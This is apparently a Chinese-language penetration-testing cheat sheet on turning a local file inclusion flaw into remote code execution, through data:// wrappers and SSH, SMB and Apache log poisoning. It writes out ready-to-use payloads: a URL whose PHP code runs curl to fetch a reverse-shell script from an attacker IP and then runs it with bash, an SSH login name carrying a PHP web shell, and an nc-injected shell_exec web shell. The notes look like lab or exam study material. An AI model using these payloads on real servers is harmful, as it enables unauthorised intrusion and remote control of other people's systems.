---
description: 常借助于日志写入来造成rce,如果有phpinfo,那就是rce,又是也借助伪协议
---

# lfi

当获取lfi之后，可以选择的方式有如下几个

ssh日志中毒，web日志中毒，smb日志中毒，写文件后访问，还有伪协议（比赛用的多，实际很少）

参考链接

{% embed url="https://www.anquanke.com/post/id/177491" %}



我认为最好用的方法：（写入再访问）

```bash
http://10.11.1.35/section.php?page=data:text/plain,<?php echo shell_exec("curl http://192.168.119.167/reverseshell.sh --output /tmp/reverseshell.sh");?>

http://10.11.1.35/section.php?page=data:text/plain,<?php echo shell_exec("bash /tmp/reverseshell.sh");?>
```

1.  ssh日志中毒（不过直接看不到的话不建议继续尝试）

    ```bash
    留日志方式：
    ssh '<?php system($_GET['xss']); ?>'@192.168.1.119

    ubuntu默认位置/var/log/auth.log
    centos默认位置/var/log/secure
    如果都没有
    查看/etc/ssh/sshd_config
    定位到记录日志使用的SyslogFacility
    查看/etc/rsyslog.conf 
    定位到对应SyslogFacility 的存储路径
    ```
2. smb日志中毒

```bash
留日志方式
rect to <php>

具体的路径我忘记了
需要用的话可以百度
```

1. web日志中毒

```bash
一般方法实例
nc -nv 10.11.0.22 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
404也正常，但是日志就会写入了
HTTP/1.1 400 Bad Request

1. /proc/self/environ
需要有/proc/self/environ的读取权限
修改ua头

2. /proc/self/fd/xxx
referer或报错等写入php代码

3. apache日志
需要有/var/log/apache2/...的读取权限
包含access.log和error.log来rce
但log文件过大会超时返回500，利用失败
```

更多的apache日志地址

```bash
https://github.com/tennc/fuzzdb/blob/master/attack-payloads/lfi/common-unix-httpd-log-locations.txt
```
